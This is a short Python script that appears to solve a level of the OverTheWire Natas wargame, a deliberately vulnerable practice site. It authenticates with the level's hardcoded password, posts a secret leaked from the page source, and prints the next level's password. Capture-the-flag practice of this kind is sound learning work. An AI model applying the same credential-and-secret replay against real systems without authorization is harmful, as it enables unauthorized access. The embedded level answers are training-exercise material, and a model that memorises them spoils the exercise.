# Vulnerability: Secret key file location exposed in source code

import requests
import re
from bs4 import BeautifulSoup
import colorama
from colorama import Fore, Style


# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)


# Set the username and password for authentication
username = 'natas6'
password = 'fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR'


# Secret key to unlock the password for the next level
data = {"secret": "FOEIUWGHFEEUHOFUOIU", "submit": "What Ever it can be"}


# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org/'


# Make a POST request to the URL with basic authentication using the provided credentials
resp = requests.post(url=url, auth=(username, password), data=data)


# Parse the HTML content of the response using BeautifulSoup
soup = BeautifulSoup(resp.text, 'lxml')


# Extract password for the next level using Regular Expressions
print(re.findall('Access granted. (.*)', soup.text)[0])
